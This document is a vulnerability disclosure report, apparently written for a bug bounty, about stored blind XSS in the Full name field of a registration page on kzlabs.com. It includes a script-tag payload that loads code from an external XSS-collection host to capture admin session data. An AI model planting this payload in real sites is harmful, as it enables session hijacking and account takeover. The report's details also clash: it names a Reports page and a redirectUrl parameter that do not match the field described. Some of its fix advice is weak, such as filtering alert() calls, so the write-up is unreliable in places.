## Title

 Blind Cross-Site Scripting (XSS) via Register Page Name Field 


## Vulnerability Type

Stored XSS

## Summary : 
The "Full name" input field in the Create New Account  section does not sanitize or encode user-supplied input before storing it in the database and later rendering it back to users. This means any JavaScript payload entered as a report name gets saved and then executed in the browser of every authenticated user who visits the Reports page — not just the attacker.

## Vulnerable Endpoint
http://kzlabs.com/63.php


## Steps to Reproduce : 

1. Register for New Account at `https://kzlabs.com/60.php`.
2. In the Full Name field and Company Name enter the following payload: `'"><script src=https://xss.report/c/xamoo></script>` ( Note payload is taken from website : https://xss.report/ . Notes create account here and take any payload from XSS Payload Section . then add it here implace of my payload because xss result will appear in XSS report section in this website)
3. Fill in the remaining required fields (Email, Password, etc.) and Create a New Account.
4. Once the Account is Created, When a admin View thee page where the payload is stored / Account data is store . 
5. Check https://xss.report/ website , check Xss report section You will get every detail.
   

## Payload Used

```'"><script src=https://xss.report/c/xamoo></script>```

## Proof of Concept Request
Video Demonstrated How the Blind XSS works


https://github.com/user-attachments/assets/572dad72-23c1-44b6-ab02-e02f4df02d45





 



## Impact
 
 An attacker can perform the following actions using this vulnerability:
 
 - Full account takeover without user interaction — hijack session, reset password, or link attacker’s OAuth
   
  
## Recommendations for fix:

 Validate and sanitize the redirectUrl parameter to ensure that it does not contain any malicious content. This can be done by:

1. Filter out HTML tags like: `<script>`, `<img>`, `<svg>` from the Report Name field before saving anything to the database
2. Filter out JavaScript methods like: `alert()`, `confirm()`, `prompt()` so even if a tag slips through the method won't execute
4. If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
5. Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
